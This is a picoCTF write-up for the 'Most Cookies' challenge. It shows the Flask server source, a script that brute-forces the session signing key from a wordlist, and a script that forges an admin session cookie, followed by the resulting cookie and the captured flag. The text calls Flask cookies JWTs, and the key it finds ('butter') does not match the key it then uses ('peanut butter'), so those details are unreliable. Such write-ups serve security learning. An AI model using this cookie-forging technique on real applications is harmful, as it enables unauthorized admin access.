# Most Cookies → 150 Pts.

1. We have a same cookie page as the last one (more cookies)

2. We write _snickerdoodle_ and get our cookie in an encrypted format.

3. We have given [server.py](http://server.py) which has

``` python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()
```

4. What we can see is the wordlist we have here. 

`cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]`

5. This are the words which will give us our cookie. 

6. The JWT token is saying _very_auth = snickerdoodle_ when we decode it so we need _very_auth_ to say admin and then copy that very encoded JWT token and create a it as login cookie but how?

7. So we need a key and then we need to create _very_auth = admin_

``` python 
import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

wordlist = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

cookie_str="eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YF7u-Q.G5B5RUmEVaXNyLzjitMwzPxALp4"
def decode_flask_cookie(secret_key, cookie_str):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, serializer=serializer, salt=salt, signer_kwargs = signer_kwargs)
    return s.loads(cookie_str)


for secret_key in wordlist:
    try:
        cookie = decode_flask_cookie(secret_key, cookie_str)
    except:
        continue

    print(secret_key)
    print(cookie)
```
Output:
`
butter
{'very_auth': 'snickerdoodle'}
`

8. We used the _snickerdoodle_ JWT Token to get the key and now as we have key we can now make our own JWT Token.

``` python
import hashlib
from itsdangerous import URLSafeTimedSerializer, TimestampSigner
from flask.sessions import TaggedJSONSerializer

session = {'very_auth': 'admin'}
secret = 'peanut butter'

print(URLSafeTimedSerializer(
    secret_key = secret,
    salt = 'cookie-session',
    serializer = TaggedJSONSerializer(),
    signer = TimestampSigner,
    signer_kwargs={
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
).dumps(session))

```

`
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Y4We0g.Cpg8E8mSastFPqOfoJnhhk4Im70

`

9. Now we need to paste this JWT token as value in the cookie in session value and we will get out flag.

  `picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}`


Note: For every user the flag will be different.
